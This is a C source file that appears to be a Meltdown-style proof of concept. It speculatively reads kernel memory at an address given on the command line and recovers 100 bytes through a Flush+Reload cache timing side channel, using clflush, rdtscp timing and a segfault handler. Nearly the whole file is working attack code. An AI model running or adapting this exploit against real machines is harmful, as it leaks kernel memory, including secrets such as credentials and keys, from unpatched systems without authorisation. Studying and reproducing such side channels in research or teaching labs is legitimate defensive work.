#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <sched.h>


//Array os size 256 pages. (Each page is associated to an ASCII char)
char array[256*4096];

//Threshold for cache hit. Considered a hit when less than 100 and miss otherwise
#define THRESOLD 80

//The offset in the page to access a byte
#define DELTA 1024

//The number of times myaccess is called
#define TRIALS 1000000

//The number of times assembly code is iterated in myaccess
#define SUBTRIALS 100


//This is used to touch the address p
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

//Flushing the address p from the caches 
static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

//Flushing the array for all the corresponding ASCII chars 
static inline
void flush_array()
{	
	for (int i = 0; i < 256; i++) {
		array[i*4096 + DELTA] = 1;
	}
	for (int i=0; i<256*4096; i++) {
		flush((void*) array + i);
	}
}

//To store the context before segmentation fault arises
static sigjmp_buf jbuf;

//SIGSEGV handler that resets the context to the context in jbuf
static void catch_segv(int signum){
  siglongjmp(jbuf, 1);
}

//Assembly code to access the kernel virtual space illegally
static inline
void myaccess(void* addr){
	int count = 0;
	sigsetjmp(jbuf, 1);
	if(count < SUBTRIALS){
		count++;
		sched_yield();
		asm volatile(
			"1:\n\t"

			".rept 400;"                
			"add $0x141, %%rax;"
			".endr;"

			"movzx (%[address]), %%eax\n\t"
			"shl $12, %%rax\n\t"
			"add $1024, %%rax\n\t"
			"jz 1b\n\t"
			"movzx (%[target], %%rax, 1), %%rbx\n"
			:
			: [target] "r" (array), [address] "r" (addr)
			: "rax", "rbx"
		);
	}
	return;
}



int main(int argc, char const *argv[]){
	signal(SIGSEGV, catch_segv);
	if(argc != 3){
		printf("Usage\n");
		return 0;
	}
	uint64_t k_addr = strtoull(argv[2],NULL,0);
	uint64_t offset = strtoull(argv[1],NULL,0);
	uint64_t addr = k_addr+offset;
	printf("physical address : %zx\n",k_addr);
	printf("kernel offset : %zx\n",offset);
	printf("read from : %zx\n",addr);
	char * test = "abcdefghijklmnopqrstuvwxyz";
	int num_bytes = 100;
	for(int r = 0;r<num_bytes;r++){
		int value = 0;
		flush_array();
		for(int t=0;t<TRIALS;t++){
			myaccess((void*) addr+r);
			int junk = 0;
			for(int i=0;i<256;i++){
				register uint64_t time1,time2;
				time1 = __rdtscp(&junk);
				junk = array[i*4096+DELTA];
				time2 = __rdtscp(&junk)-time1;
				flush((void*) array+i*4096+DELTA);

				if(time2 < THRESOLD) {
					if(i != 0){
						value = i;
						t = TRIALS;
					}
				}
			}
			sched_yield();
		}
		if(value == 0) printf("?");
		else printf("%c",value);
		fflush(stdout);
	}
	printf("\nOver \n");
}